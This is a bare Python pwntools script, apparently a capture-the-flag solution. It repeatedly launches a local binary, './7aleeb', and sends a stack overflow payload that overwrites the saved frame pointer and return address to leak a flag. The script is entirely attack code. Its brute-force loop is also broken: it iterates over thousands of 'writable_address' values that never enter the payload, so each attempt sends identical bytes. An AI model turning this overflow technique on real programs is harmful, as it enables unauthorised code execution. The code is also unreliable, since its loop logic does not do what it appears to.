from pwn import *
from tqdm import tqdm
context.binary = binary = ELF('./7aleeb', checksec=False)
context.log_level = 'error'

address = 0x00000000004012d1 
writable_addresses = [0x404000,0x7ffff7d83000,0x7ffff7fa0000,0x7ffff7fa2000,0x7ffff7fbb000,0x7ffff7ffd000,0x7ffffffde000]
sizes = [0x1000,0x3000,0x2000,0xd000,0x2000,0x2000,0x21000]
assert len(writable_addresses) == len(sizes)
for i in range(len(writable_addresses)):
    for j in tqdm(range(0, sizes[i])):
        writable_address = writable_addresses[i] + j
        try:
            p = process(context.binary.path)
            p.recvline()
            payload = b'A'*48 + p64(0x4042c3) + p64(address)
            p.sendline(payload)
            flag = p.recvuntil(b'}').decode()
            print(f'{flag}: {hex(writable_address)}')
        except:
            print(f'Error: {hex(writable_address)}')
        p.close()   